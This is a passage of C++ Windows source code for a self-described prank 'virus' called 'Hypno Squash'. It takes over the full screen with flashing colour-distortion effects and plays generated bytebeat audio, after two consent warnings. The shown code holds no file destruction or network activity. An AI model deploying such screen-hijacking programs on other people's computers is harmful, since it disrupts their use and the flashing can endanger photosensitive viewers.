		HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		BITMAPINFO bmi = { 40, w, h, 1, 24 };
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&rgbtriple, 0, 0);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / w, average = cos((rgbtriple[i].rgbtBlue + rgbtriple[i].rgbtRed + rgbtriple[i].rgbtGreen) / 2);
			int fx = ((x ^ (xxx + y)) + xxx ^ y - 1);
			rgbtriple[i].rgbtRed ^= average ^ fx;
			rgbtriple[i].rgbtGreen = average ^ fx;
			rgbtriple[i].rgbtRed ^= average ^ fx;
		}
		for (int y = 0; y < h; y += 20) {
			StretchBlt(hcdc, -3 + rand() % 6, y, w, 20, hcdc, 0, y, w, 20, SRCAND);
		}
		for (int x = 0; x < w; x += 20) {
			StretchBlt(hcdc, x, -1 + rand() % 3, 20, h, hcdc, x, 0, 20, h, SRCPAINT);
		}
		BitBlt(hcdc, rand() % 20, 0, w, h, hcdc, rand() % 20, 0, SRCCOPY);
		for (int i = 0; i < 4; i++) {
			int randx = rand() % w, randw = (rand() % w / 4);
			if ((rand() % 100) > 50) { src = SRCAND; }
			else { src = SRCPAINT; }
			StretchBlt(hcdc, randx, 20 - (rand() % 40), randw, h, hcdc, randx, 0, randw, h, src);
			int randy = rand() % h, randh = (rand() % h / 4);
			if ((rand() % 100) > 50) { src = SRCAND; }
			else { src = SRCPAINT; }
			StretchBlt(hcdc, 20 - (rand() % 40), randy, w, randh, hcdc, 0, randy, w, randh, src);
		}
		AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
		DeleteObject(hcdc); DeleteObject(hdc);
		Sleep(1); xxx += 7;
	}
}
DWORD WINAPI shader3(LPVOID lpParam)//credits to MazeIcon for the base
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (true)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				int fx = (int)((i ^ 4) + (i * 4) * cbrt((x ^ y) + x) - 1);

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f + i / 1000.f, 1.f);
				hslcolor.s = 0.7f;
				hslcolor.l = 0.5f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, NOTSRCERASE);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}

	return 0;
}
DWORD WINAPI shader4(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	PRGBQUAD prgbScreen;
	HDC hcdc = CreateCompatibleDC(hdc);
	HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&prgbScreen, NULL, 0);
	SelectObject(hcdc, hBitmap);
	while (true)
	{
		hdc = GetDC(NULL);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			prgbScreen[i].r += 12;
			prgbScreen[i].g *= 19;
			prgbScreen[i].b -= 26;
		}
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteObject(hdc);
		Sleep(10);
	}
	DeleteObject(hBitmap);
	DeleteDC(hcdc);
	return 0;
}
DWORD WINAPI shader5(LPVOID lpParam) {
	int i = 0; RGBQUAD rgbquadCopy; HSL hslcolor;
	while (true)
	{
		HDC hdc = GetDC(NULL);
		HDC hcdc = CreateCompatibleDC(hdc);
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		BITMAPINFO bmpi = { 0 };

		bmpi.bmiHeader.biSize = sizeof(bmpi);
		bmpi.bmiHeader.biWidth = w;
		bmpi.bmiHeader.biHeight = h;
		bmpi.bmiHeader.biPlanes = 1;
		bmpi.bmiHeader.biBitCount = 32;
		bmpi.bmiHeader.biCompression = BI_RGB;

		RGBQUAD* rgbquad = NULL;

		HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = x * h + y;
				int fx = (int)((i ^ 3) + (i * 6) * cbrt(x * i ^ i * y + x ^ i + y + i ^ i * x & y ^ i) + 1);
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);
				hslcolor.s = 2.f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;
		HBRUSH hBrush = CreateSolidBrush(RndRGB);
		SelectObject(hcdc, hBrush);
		PatBlt(hcdc, 0, 0, w, h, PATINVERT);
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc);
		ReleaseDC(NULL, hcdc);
		DeleteObject(hBitmap);
		DeleteObject(hBrush);
		DeleteDC(hcdc);
		DeleteDC(hdc);
		Sleep(100);
	}
	return 0;
}
DWORD WINAPI shader6(LPVOID lpvd) //credits to pankoza for the base
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = -screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;
				FLOAT fx = ((x + y << x & y * i) + (i + i * 10) - 1);

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 700.f + y / screenHeight * .10f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
}
DWORD WINAPI last(LPVOID lpvd)//credits to WinMalware
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = -w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	int offsetY = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				// Generate a grayscale value based on position and offset
				BYTE gray = (BYTE)(255 * ((x + y + offsetY) % 256) / 255);

				// Set the RGBQUAD to the grayscale value
				rgbquad[index].rgbRed = gray;
				rgbquad[index].rgbGreen = gray;
				rgbquad[index].rgbBlue = gray;
			}
		}

		// Copy the bitmap to the screen
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);

		// Release the device context
		ReleaseDC(NULL, hdc);

		// Update the offset to move the pattern downward
		offsetY += 2; // Adjust the value to control the speed of movement

		// Ensure offset wraps around to avoid excessive scrolling
		if (offsetY >= h) {
			offsetY = 0;
		}

		// Delay to control the update rate
		Sleep(10);
	}

	// Clean up resources (though this line will never be reached)
	DeleteDC(hdcCopy);
	DeleteObject(bmp);

	return 0x00;
}
VOID WINAPI bytebeat1() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((t >> 9 & 1 + t >> 12 & 7 ? 0 : 9001 / ((t % 4096) + 1) - t / 9 & 8 ? -1 : 0) ^ t >> 4 & t * (t >> 5 | t >> 8) >> (t >> 16))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat2() {
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t * (t * 2 | t >> 8) | t) + ((t >> 78) - (t / 91)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat3() {
	int nSamplesPerSec = 17777, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((666 & t * (t & t >> 13)) >> 91) + ~(666 & t * (666 & t >> 8 & t >> 3) >> ((t ^ t) / 91)) * t - 666);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat4() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t / (0x20130226) + t * (0x004a412a >> (t >> 9 & 30) & 14) | (t >> 4) | t / ((t & 16384 ? 64 : 27) + 1)) + ~t);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat5() {
	int nSamplesPerSec = 24000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t & (t >> 7)) + (t | (t >> 8)) * (t & (t >> 9)) + (t | (t ^ 9)) & 674));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat6() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(t % 133 ^ (t >> 78 | t >> 91 | t) * t >> (78 & t >> 78));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat7() {
	int nSamplesPerSec = 11000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t + (t ^ (t >> 5))) >> (((t & 0x2000) != 0 ? 3 : 5) - t * ((t >> 3) & (t >> 9) & (4 * ((t & 0xF) == 0) + 2))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat8() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((2 * (t >> 5 & t) + (t >> 5) + t) * 129 & (t % 91) + 46);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat9() {//credits to n17pro3426
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t - (t >> 12) % 5 + 14) & ((t / (0xA + 1)) | ((t * (((1 >> ((t >> 19) & 3)) & 0x13) + 19)) >> 3))) - (t / (0xA + 1)) + 9810 | t );
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat10() {
	int nSamplesPerSec = 44100, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t * (((t << 1) ^ (((t << 1) + (t >> 7)) & (t >> 12))) | (t >> 4 - (1 ^ (7 & (t >> 19)))) | (t >> 7))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat11() {
	int nSamplesPerSec = 22000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((tan(t & t >> 5) - sinh(t & t >> 7)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
int main()
{
	InitDPI();
	srand(time(NULL));
	SeedXorshift32((DWORD)time(NULL));
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	CREATE_NO_WINDOW;
	HHOOK hMsgHookA = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	if (MessageBoxA(NULL, "Warning! This program is a computer virus that known as 'Hypno Squash'. It may make your computer cannot work normally. Whether to run or not?\r\n\Please don't maliciously open this program on other people's or public computers! If you accidentally opened it, please click the \"No\" button to cancel the run. If you want to run it, please make sure you are running it on your own computer, or ensure that the virus on this computer is in a secure environment (such as a virtual machine, sandbox, etc.) and turn off all antivirus software. If you are running this program on other people's or public computers, please make sure you are running the harmless edition of this program, and then click the \"Yes\" button to continue.", "Hypno Squash.exe--First warning", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDNO)
	{
		UnhookWindowsHookEx(hMsgHookA);
		ExitProcess(0);
	}
	else
	{
		CREATE_NO_WINDOW;
		HHOOK hMsgHookA = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
		if (MessageBoxW(NULL, L"This is the last warning!!!\r\n\Do you want to really run? After running, your computer may not work normally! If you run the harmful edition of this program on other people's or public computers, you will be responsible for any losses and legal liabilities caused by running this program! The writer of this computer virus(LambdaTechnology) isn't responsible!!!", L"Hypno Squash.exe--LAST WARNING", MB_YESNO | MB_ICONWARNING) == IDNO)
		{
			UnhookWindowsHookEx(hMsgHookA);
			ExitProcess(0);
		}
		else
		{
			Sleep(5000);
			HANDLE thread1_num1 = CreateThread(0, 0, shader1, 0, 0, 0);
			HANDLE thread1_num2 = CreateThread(0, 0, stretchblt_getrectangle, 0, 0, 0);
			HANDLE thread1_num3 = CreateThread(0, 0, beziers, 0, 0, 0);
			bytebeat1();
			TerminateThread(thread1_num1, 0);
			TerminateThread(thread1_num2, 0);
			TerminateThread(thread1_num3, 0);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread2_num1 = CreateThread(0, 0, shader2, 0, 0, 0);
			HANDLE thread2_num2 = CreateThread(0, 0, ccb, 0, 0, 0);
			bytebeat2();
			TerminateThread(thread2_num1, 0);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread3 = CreateThread(0, 0, drawbytebeat1, 0, 0, 0);
			bytebeat3();
			TerminateThread(thread3, 0);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread4_num1 = CreateThread(0, 0, shader3, 0, 0, 0);
			//HANDLE thread4_num2 = CreateThread(0, 0, beziers, 0, 0, 0);
			bytebeat4();
			TerminateThread(thread4_num1, 0);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread5_num1= CreateThread(0, 0, shader4, 0, 0, 0);
			HANDLE thread5_num2 = CreateThread(0, 0, stretchblt_mosaic, 0, 0, 0);
			bytebeat5();
			TerminateThread(thread5_num1, 0);
			TerminateThread(thread5_num2, 0);
			//TerminateThread(thread4_num2, 0);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread6_num1 = CreateThread(0, 0, shader5, 0, 0, 0);
			HANDLE thread6_num2 = CreateThread(0, 0, words, 0, 0, 0);
			//HANDLE thread6_num2 = CreateThread(0, 0, ico, 0, 0, 0);
			bytebeat6();
			TerminateThread(thread6_num1, 0);
			TerminateThread(thread2_num2, 0);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread7_num1 = CreateThread(0, 0, shader6, 0, 0, 0);
			HANDLE thread7_num2 = CreateThread(0, 0, blur1, 0, 0, 0);
			bytebeat7();
			TerminateThread(thread7_num1, 0);
			TerminateThread(thread7_num2, 0);
			refreshscr();
			HANDLE thread8_num1 = CreateThread(0, 0, mandelbrot_like, 0, 0, 0);
			HANDLE thread8_num2 = CreateThread(0, 0, tesseract, 0, 0, 0);
			bytebeat8();
			TerminateThread(thread8_num1, 0);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread9_num1 = CreateThread(0, 0, anyblt1, 0, 0, 0);
			HANDLE thread9_num2 = CreateThread(0, 0, anyblt2, 0, 0, 0);
			HANDLE thread9_num3 = CreateThread(0, 0, biginvertcircle, 0, 0, 0);
			bytebeat9();
			TerminateThread(thread9_num1, 0);
			TerminateThread(thread9_num2, 0);
			TerminateThread(thread9_num3, 0);
			refreshscr();
			HANDLE thread10 = CreateThread(0, 0, drawbytebeat2, 0, 0, 0);
			bytebeat10();
			TerminateThread(thread10, 0);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread11 = CreateThread(0, 0, bitblt_swir, 0, 0, 0);
			bytebeat11();
			TerminateThread(thread11, 0);
			InvalidateRect(0, 0, 0);
			refreshscr();
			//HANDLE thread12 = CreateThread(0, 0, last, 0, 0, 0);
			//bytebeat12();
			//TerminateThread(thread12, 0);
			//InvalidateRect(0, 0, 0);
			//refreshscr();
			TerminateThread(thread6_num2, 0);
			TerminateThread(thread8_num2, 0);
		}
	}
	return 0;
}